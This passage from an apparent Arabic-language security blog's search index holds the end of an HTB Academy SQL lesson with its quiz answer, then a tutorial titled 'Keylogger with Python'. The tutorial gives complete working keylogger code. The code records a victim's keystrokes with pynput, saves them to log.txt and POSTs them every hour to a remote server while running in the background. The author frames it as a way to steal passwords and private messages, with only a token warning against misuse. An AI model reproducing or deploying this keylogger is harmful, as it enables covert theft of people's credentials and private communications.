السجلات يلي ظهرت بتحقق الشرطين، الاسم ليس tom و ال id اكبر من 1.رح نشوف غير سيناريوهات لل operator precedence بالأقسام القادمة.  HTB Questions:Answer the question(s) below to complete this Section and earn cubes! In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?    Answer: 654"
  },
  
  {
    "title": "Keylogger with Python in Arabic",
    "url": "/posts/Keylogger/",
    "categories": "Python_for_Hackers",
    "tags": "Python, Keylogger, Security, PenetrationTesting, Hacker",
    "date": "2025-03-24 00:00:00 +0300",
    





    
    "snippet": "كيف تكتب Keylogger بسيط بالـ Python؟💡 المقدمةاول شي خلونا نفهم شو يعني Keylogger , ال Keylogger هو عبارة عن برنامج بسجل عندي ضغطات الكيبورد تبع الضحية وهيك بقدر اعرف الحسابات وكلمات السر او حتى الر...",
    "content": "كيف تكتب Keylogger بسيط بالـ Python؟💡 المقدمةاول شي خلونا نفهم شو يعني Keylogger , ال Keylogger هو عبارة عن برنامج بسجل عندي ضغطات الكيبورد تبع الضحية وهيك بقدر اعرف الحسابات وكلمات السر او حتى الرسائل الخاصة.واليوم رح نعمل سوا Keylogger بسيط بلغة Python ونتعرف على آلية عمله بالتفصيل.📌 رح يغطي هذا الدرس: كيف بتسجل ضغطات الكيبورد باستخدام مكتبة pynput  تخزين هالبيانات ضمن ملف  كيف نبعت هالملف من جهاز الضحية للسيرفر الخاص فينا  تشغيل برنامجنا  كبرنامج مستمر يضل شغال بال Background  الكود كامل: Keylogger بالبايثونimport requestsimport threadingfrom pynput.keyboard import Key, Listener# رابط السيرفر لاستقبال البياناتSERVER_URL = \"http://your-server.com/logs\"  # استبدله برابط السيرفر الخاص بكdef write_to_file(key):    \"\"\"    تخزين ضغطات المفاتيح في ملف log.txt    \"\"\"    try:        keydata = str(key).replace(\"'\", \"\")        # التعامل مع المفاتيح الخاصة        if key == Key.space:            keydata = ' '        elif key == Key.enter:            keydata = '\\n'        elif key in (Key.shift, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r):            keydata = ''  # تجاهل مفاتيح التعديل        # حفظ المفاتيح في الملف        with open('log.txt', 'a') as f:            f.write(keydata)        except Exception as e:        print(f\"Error: {e}\")def send_logs():    \"\"\"    إرسال البيانات المخزنة إلى السيرفر كل ساعة    \"\"\"    try:        with open(\"log.txt\", \"r\") as f:            logs = f.read()                if logs.strip():  # الإرسال فقط إذا كان هناك بيانات            response = requests.post(SERVER_URL, data={\"logs\": logs})            if response.status_code == 200:                print(\"Logs sent successfully!\")                open(\"log.txt\", \"w\").close()  # مسح الملف بعد الإرسال            else:                print(f\"Failed to send logs, status code: {response.status_code}\")        except Exception as e:        print(f\"Error sending logs: {e}\")    # جدولة إعادة التنفيذ كل ساعة    threading.Timer(3600, send_logs).start()# بدء الإرسال التلقائيsend_logs()# تشغيل الـ Keyloggerwith Listener(on_press=write_to_file) as listener:    listener.join()تحليل الكود📌 1. تسجيل ضغطات المفاتيح:  مكتبة الpynput بتساعدني لتسجيل كل ضغطة زر عالكيبورد وتحليلها.  المفاتيح الخاصة (مثل Shift و Enter) منتعامل معها بطريقة مناسبة.  منحفظ كل ضغطة عالكيبورد بملف log.txt.📌 2. إرسال البيانات إلى سيرفر:  منقرأ محتوى ملف log.txt كل ساعة.  إذا كان عندي بيانات، فبيبعتلي ياها ل  السيرفر عبر requests.post().  بعد ما يتم الارسال بقلو يمسحلي الملف حتى مايصير عندي تكرار بالإرسال.📌 3. تشغيل الكي لوجر بالخلفية:  استخدمت threading.Timer حتى يضل عم يرسل البيانات بشكل دوري.  Listener بضل شغال حتى حدا يوقف البرنامج يدويًا.الخاتمةهيك صار عندك Keylogger بسيط وفعال وهاد الشي حتى تفهم آلية عمله ويكون عندك الفهم البرمجي لطريقة عمله, فلا تستخدموا بطريقة غلط🌚.وهلق خبرني شو رأيك بالكود؟ وهل عندك أفكار لتطويره؟🤔"
  }
  
]

